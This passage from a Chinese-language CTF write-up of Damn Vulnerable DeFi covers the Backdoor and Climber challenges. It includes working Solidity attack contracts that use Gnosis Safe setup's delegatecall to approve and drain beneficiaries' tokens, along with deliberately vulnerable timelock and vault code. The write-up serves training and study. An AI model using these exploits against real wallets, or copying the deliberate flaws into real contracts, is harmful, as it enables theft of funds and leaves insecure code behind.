uint256(keccak256(&quot;fallback_manager.handler.address&quot;)),</span><br><span class="line">                0x20</span><br><span class="line">            ),</span><br><span class="line">            (address)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-10"><a href="#Analysis-10" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题是让我们从注册表中拿到所有资金，而只有题目给出的四个注册人在注册并部署钱包成功后才会获得奖金，而我们应该如何获得奖金，可以先看看题目合约的函数。</p>
<p>我们看看<code>proxyCreated()</code>函数，其中要求调用者必须是<code>walletFactory</code>，并且传输的<code>calldata</code>的前四个字节必须是<code>GnosisSafe</code>合约中<code>setup()</code>函数的选择器。这时我们就可以先看看<code>GnosisSafeProxyFactory</code>合约如何去调用这个函数。</p>
<p>我们看到要想用<code>walletFactory</code>去调用<code>proxyCreated()</code>函数就要调用这里的<code>createProxyWithCallback()</code>函数，这时我们可以看到<code>createProxyWithCallback()</code>函数中调用的<code>createProxyWithNonce()</code>函数会调用我们传入的<code>calldata</code>，而由于满足了<code>proxyCreated()</code>这个函数中的条件，我们会调用<code>GnosisSafe</code>合约中的<code>setup()</code>函数，而在这个函数里我们可以看到<code>setupModules()</code>函数，这个函数会利用<code>delegatecall()</code>函数去调用目标地址的函数，由此思路就出来了，我们构造一个<code>calldata</code>，在其中<code>to</code>和<code>data</code>的参数位置，放置一个攻击合约的地址，并在其中写一个<code>approve</code>函数，然后在<code>data</code>中调用它，在我们以受益人的身份注册部署钱包获得资金后，我们就可以将其拿走。</p>
<p>而题目要求我们交易次数为<code>1</code>，我们只需要在构造函数中完成所有操作，即可在部署函数的时候完成，这样我们的交易次数就为<code>1</code>，而要在构造函数中执行，我们就不能将授权函数写在一个合约里。</p>
<h4 id="Attack-10"><a href="#Attack-10" class="headerlink" title="Attack"></a>Attack</h4><h5 id="WalletRegistryAttack-sol"><a href="#WalletRegistryAttack-sol" class="headerlink" title="WalletRegistryAttack.sol"></a>WalletRegistryAttack.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm/safe-contracts/contracts/common/Enum.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol&quot;;</span><br><span class="line">import &quot;./WalletRegistry.sol&quot;;</span><br><span class="line">import &quot;./WalletRegistryAttack2.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract WalletRegistryAttack&#123;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    address[] users;</span><br><span class="line">    WalletRegistry target;</span><br><span class="line">    GnosisSafeProxyFactory factory;</span><br><span class="line">    GnosisSafe mastercopy;</span><br><span class="line">    DamnValuableToken token;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr1,address _addr2,address _addr3,address _addr4,address _addr5,address _addr6,address payable _addr7,address _addr8,address player)&#123;</span><br><span class="line">        WalletRegistryAttack2 attack2 = new WalletRegistryAttack2();</span><br><span class="line">        users = new address[](4);</span><br><span class="line">        users[0] = _addr1;</span><br><span class="line">        users[1] = _addr2;</span><br><span class="line">        users[2] = _addr3;</span><br><span class="line">        users[3] = _addr4;</span><br><span class="line">        target = WalletRegistry(_addr5);</span><br><span class="line">        factory = GnosisSafeProxyFactory(_addr6);</span><br><span class="line">        mastercopy= GnosisSafe(_addr7);</span><br><span class="line">        token = DamnValuableToken(_addr8);</span><br><span class="line">        for(uint256 i=0;i&lt;4;i++)&#123;</span><br><span class="line">            address[] memory owner = new address[](1);</span><br><span class="line">            owner[0]=users[i];</span><br><span class="line">            bytes memory initializer = abi.encodeWithSelector(</span><br><span class="line">                mastercopy.setup.selector,</span><br><span class="line">                owner,</span><br><span class="line">                1,</span><br><span class="line">                address(attack2),</span><br><span class="line">                abi.encodeWithSelector(attack2.tokenapprove.selector,address(token),address(this)),</span><br><span class="line">                address(0),</span><br><span class="line">                address(0),</span><br><span class="line">                uint256(0),</span><br><span class="line">                address(0)</span><br><span class="line">            );</span><br><span class="line">            GnosisSafeProxy proxy = factory.createProxyWithCallback(address(mastercopy),initializer,1,IProxyCreationCallback(target));</span><br><span class="line">            token.transferFrom(address(proxy),player,10 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="WalletRegistryAttack2-sol"><a href="#WalletRegistryAttack2-sol" class="headerlink" title="WalletRegistryAttack2.sol"></a>WalletRegistryAttack2.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract WalletRegistryAttack2&#123;</span><br><span class="line">    function tokenapprove(address _token,address user) public&#123;</span><br><span class="line">        DamnValuableToken(_token).approve(user,10 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="js-7"><a href="#js-7" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Attack</span> = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;WalletRegistryAttack&#x27;</span>, player)).<span class="title function_">deploy</span>(users[<span class="number">0</span>],users[<span class="number">1</span>],users[<span class="number">2</span>],users[<span class="number">3</span>],walletRegistry.<span class="property">address</span>,walletFactory.<span class="property">address</span>,masterCopy.<span class="property">address</span>,token.<span class="property">address</span>,player.<span class="property">address</span>, &#123;<span class="attr">gasLimit</span>: <span class="number">30000000</span>&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-12-Climber"><a href="#Challenge-12-Climber" class="headerlink" title="Challenge #12 - Climber"></a>Challenge #12 - Climber</h3><p>There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the <a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-1822">UUPS pattern</a>.</p>
<p>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.</p>
<p>On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.</p>
<p>On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.</p>
<p>To pass this challenge, take all tokens from the vault.</p>
<h4 id="Code-11"><a href="#Code-11" class="headerlink" title="Code"></a>Code</h4><h5 id="ClimberConstants-sol"><a href="#ClimberConstants-sol" class="headerlink" title="ClimberConstants.sol"></a>ClimberConstants.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/* ########################## */</span><br><span class="line">/* ### TIMELOCK CONSTANTS ### */</span><br><span class="line">/* ########################## */</span><br><span class="line"></span><br><span class="line">// keccak256(&quot;ADMIN_ROLE&quot;);</span><br><span class="line">bytes32 constant ADMIN_ROLE = 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775;</span><br><span class="line"></span><br><span class="line">// keccak256(&quot;PROPOSER_ROLE&quot;);</span><br><span class="line">bytes32 constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;</span><br><span class="line"></span><br><span class="line">uint256 constant MAX_TARGETS = 256;</span><br><span class="line">uint256 constant MIN_TARGETS = 0;</span><br><span class="line">uint256 constant MAX_DELAY = 14 days;</span><br><span class="line"></span><br><span class="line">/* ####################### */</span><br><span class="line">/* ### VAULT CONSTANTS ### */</span><br><span class="line">/* ####################### */</span><br><span class="line"></span><br><span class="line">uint256 constant WITHDRAWAL_LIMIT = 1 ether;</span><br><span class="line">uint256 constant WAITING_PERIOD = 15 days;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ClimberErrors-sol"><a href="#ClimberErrors-sol" class="headerlink" title="ClimberErrors.sol"></a>ClimberErrors.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">error CallerNotTimelock();</span><br><span class="line">error NewDelayAboveMax();</span><br><span class="line">error NotReadyForExecution(bytes32 operationId);</span><br><span class="line">error InvalidTargetsCount();</span><br><span class="line">error InvalidDataElementsCount();</span><br><span class="line">error InvalidValuesCount();</span><br><span class="line">error OperationAlreadyKnown(bytes32 operationId);</span><br><span class="line">error CallerNotSweeper();</span><br><span class="line">error InvalidWithdrawalAmount();</span><br><span class="line">error InvalidWithdrawalTime();</span><br></pre></td></tr></table></figure>

<h5 id="ClimberTimelock-sol"><a href="#ClimberTimelock-sol" class="headerlink" title="ClimberTimelock.sol"></a>ClimberTimelock.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;./ClimberTimelockBase.sol&quot;;</span><br><span class="line">import &#123;ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY&#125; from &quot;./ClimberConstants.sol&quot;;</span><br><span class="line">import &#123;</span><br><span class="line">    InvalidTargetsCount,</span><br><span class="line">    InvalidDataElementsCount,</span><br><span class="line">    InvalidValuesCount,</span><br><span class="line">    OperationAlreadyKnown,</span><br><span class="line">    NotReadyForExecution,</span><br><span class="line">    CallerNotTimelock,</span><br><span class="line">    NewDelayAboveMax</span><br><span class="line">&#125; from &quot;./ClimberErrors.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ClimberTimelock</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract ClimberTimelock is ClimberTimelockBase &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @notice Initial setup for roles and timelock delay.</span><br><span class="line">     * @param admin address of the account that will hold the ADMIN_ROLE role</span><br><span class="line">     * @param proposer address of the account that will hold the PROPOSER_ROLE role</span><br><span class="line">     */</span><br><span class="line">    constructor(address admin, address proposer) &#123;</span><br><span class="line">        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);</span><br><span class="line">        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);</span><br><span class="line">        _setupRole(ADMIN_ROLE, admin);</span><br><span class="line">        _setupRole(ADMIN_ROLE, address(this)); // self administration</span><br><span class="line">        _setupRole(PROPOSER_ROLE, proposer);</span><br><span class="line"></span><br><span class="line">        delay = 1 hours;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function schedule(</span><br><span class="line">        address[] calldata targets,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes[] calldata dataElements,</span><br><span class="line">        bytes32 salt</span><br><span class="line">    ) external onlyRole(PROPOSER_ROLE) &#123;</span><br><span class="line">        if (targets.length == MIN_TARGETS || targets.length &gt;= MAX_TARGETS) &#123;</span><br><span class="line">            revert InvalidTargetsCount();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (targets.length != values.length) &#123;</span><br><span class="line">            revert InvalidValuesCount();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (targets.length != dataElements.length) &#123;</span><br><span class="line">            revert InvalidDataElementsCount();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bytes32 id = getOperationId(targets, values, dataElements, salt);</span><br><span class="line"></span><br><span class="line">        if (getOperationState(id) != OperationState.Unknown) &#123;</span><br><span class="line">            revert OperationAlreadyKnown(id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;</span><br><span class="line">        operations[id].known = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Anyone can execute what&#x27;s been scheduled via `schedule`</span><br><span class="line">     */</span><br><span class="line">    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">    &#123;</span><br><span class="line">        if (targets.length &lt;= MIN_TARGETS) &#123;</span><br><span class="line">            revert InvalidTargetsCount();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (targets.length != values.length) &#123;</span><br><span class="line">            revert InvalidValuesCount();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (targets.length != dataElements.length) &#123;</span><br><span class="line">            revert InvalidDataElementsCount();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bytes32 id = getOperationId(targets, values, dataElements, salt);</span><br><span class="line"></span><br><span class="line">        for (uint8 i = 0; i &lt; targets.length;) &#123;</span><br><span class="line">            targets[i].functionCallWithValue(dataElements[i], values[i]);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (getOperationState(id) != OperationState.ReadyForExecution) &#123;</span><br><span class="line">            revert NotReadyForExecution(id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        operations[id].executed = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function updateDelay(uint64 newDelay) external &#123;</span><br><span class="line">        if (msg.sender != address(this)) &#123;</span><br><span class="line">            revert CallerNotTimelock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (newDelay &gt; MAX_DELAY) &#123;</span><br><span class="line">            revert NewDelayAboveMax();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        delay = newDelay;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ClimberTimelockBase-sol"><a href="#ClimberTimelockBase-sol" class="headerlink" title="ClimberTimelockBase.sol"></a>ClimberTimelockBase.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/access/AccessControl.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ClimberTimelockBase</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">abstract contract ClimberTimelockBase is AccessControl &#123;</span><br><span class="line">    // Possible states for an operation in this timelock contract</span><br><span class="line">    enum OperationState &#123;</span><br><span class="line">        Unknown,</span><br><span class="line">        Scheduled,</span><br><span class="line">        ReadyForExecution,</span><br><span class="line">        Executed</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Operation data tracked in this contract</span><br><span class="line">    struct Operation &#123;</span><br><span class="line">        uint64 readyAtTimestamp; // timestamp at which the operation will be ready for execution</span><br><span class="line">        bool known; // whether the operation is registered in the timelock</span><br><span class="line">        bool executed; // whether the operation has been executed</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Operations are tracked by their bytes32 identifier</span><br><span class="line">    mapping(bytes32 =&gt; Operation) public operations;</span><br><span class="line"></span><br><span class="line">    uint64 public delay;</span><br><span class="line"></span><br><span class="line">    function getOperationState(bytes32 id) public view returns (OperationState state) &#123;</span><br><span class="line">        Operation memory op = operations[id];</span><br><span class="line"></span><br><span class="line">        if (op.known) &#123;</span><br><span class="line">            if (op.executed) &#123;</span><br><span class="line">                state = OperationState.Executed;</span><br><span class="line">            &#125; else if (block.timestamp &lt; op.readyAtTimestamp) &#123;</span><br><span class="line">                state = OperationState.Scheduled;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                state = OperationState.ReadyForExecution;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            state = OperationState.Unknown;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOperationId(</span><br><span class="line">        address[] calldata targets,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes[] calldata dataElements,</span><br><span class="line">        bytes32 salt</span><br><span class="line">    ) public pure returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encode(targets, values, dataElements, salt));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ClimberVault-sol"><a href="#ClimberVault-sol" class="headerlink" title="ClimberVault.sol"></a>ClimberVault.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">import &quot;./ClimberTimelock.sol&quot;;</span><br><span class="line">import &#123;WITHDRAWAL_LIMIT, WAITING_PERIOD&#125; from &quot;./ClimberConstants.sol&quot;;</span><br><span class="line">import &#123;CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime&#125; from &quot;./ClimberErrors.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ClimberVault</span><br><span class="line"> * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;</span><br><span class="line">    uint256 private _lastWithdrawalTimestamp;</span><br><span class="line">    address private _sweeper;</span><br><span class="line"></span><br><span class="line">    modifier onlySweeper() &#123;</span><br><span class="line">        if (msg.sender != _sweeper) &#123;</span><br><span class="line">            revert CallerNotSweeper();</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @custom:oz-upgrades-unsafe-allow constructor</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _disableInitializers();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize(address admin, address proposer, address sweeper) external initializer &#123;</span><br><span class="line">        // Initialize inheritance chain</span><br><span class="line">        __Ownable_init();</span><br><span class="line">        __UUPSUpgradeable_init();</span><br><span class="line"></span><br><span class="line">        // Deploy timelock and transfer ownership to it</span><br><span class="line">        transferOwnership(address(new ClimberTimelock(admin, proposer)));</span><br><span class="line"></span><br><span class="line">        _setSweeper(sweeper);</span><br><span class="line">        _updateLastWithdrawalTimestamp(block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allows the owner to send a limited amount of tokens to a recipient every now and then</span><br><span class="line">    function withdraw(address token, address recipient, uint256 amount) external onlyOwner &#123;</span><br><span class="line">        if (amount &gt; WITHDRAWAL_LIMIT) &#123;</span><br><span class="line">            revert InvalidWithdrawalAmount();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (block.timestamp &lt;= _lastWithdrawalTimestamp + WAITING_PERIOD) &#123;</span><br><span class="line">            revert InvalidWithdrawalTime();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _updateLastWithdrawalTimestamp(block.timestamp);</span><br><span class="line"></span><br><span class="line">        SafeTransferLib.safeTransfer(token, recipient, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allows trusted sweeper account to retrieve any tokens</span><br><span class="line">    function sweepFunds(address token) external onlySweeper &#123;</span><br><span class="line">        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSweeper() external view returns (address) &#123;</span><br><span class="line">        return _sweeper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _setSweeper(address newSweeper) private &#123;</span><br><span class="line">        _sweeper = newSweeper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getLastWithdrawalTimestamp() external view returns (uint256) &#123;</span><br><span class="line">        return _lastWithdrawalTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _updateLastWithdrawalTimestamp(uint256 timestamp) private &#123;</span><br><span class="line">        _lastWithdrawalTimestamp = timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an 